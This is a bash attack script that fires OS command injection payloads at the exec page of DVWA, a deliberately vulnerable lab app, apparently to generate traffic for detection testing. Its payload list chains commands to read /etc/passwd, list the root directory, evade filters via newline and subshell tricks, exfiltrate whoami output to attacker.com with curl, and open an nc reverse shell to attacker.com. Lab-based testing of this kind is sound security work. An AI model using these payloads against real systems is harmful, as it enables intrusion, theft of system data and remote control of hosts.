#!/usr/bin/env bash
# attack-cmdi.sh — OS Command Injection payloads against DVWA.
# DVWA's /vulnerabilities/exec/ takes an IP address field and passes it
# directly to ping — on "low" security level it's trivially injectable.

set -e
TARGET="${TARGET:-http://localhost:8080}"

payloads=(
  # Basic chaining
  "127.0.0.1; id"
  "127.0.0.1 && whoami"
  "127.0.0.1 | cat /etc/passwd"
  "127.0.0.1 || ls -la /"
  # Semicolon + newline evasion
  "127.0.0.1%0Aid"
  # Subshell
  "127.0.0.1; \$(id)"
  "\`id\`"
  # Blind exfil simulation
  "127.0.0.1; curl http://attacker.com/\$(whoami)"
  # Netcat reverse shell attempt (won't connect — just triggers the log)
  "127.0.0.1; nc -e /bin/sh attacker.com 4444"
)

echo "[cmdi] target=${TARGET} — OS command injection payloads"
for p in "${payloads[@]}"; do
  enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$p")
  url="${TARGET}/vulnerabilities/exec/?ip=${enc}&Submit=Submit"
  printf "  → %s\n" "$p"
  curl -s -o /dev/null -A "Mozilla/5.0 (Nikto/2.1.6)" "$url"
  sleep 0.4
done
echo "[cmdi] done — ${#payloads[@]} command injection payloads sent — check http://localhost:8000"
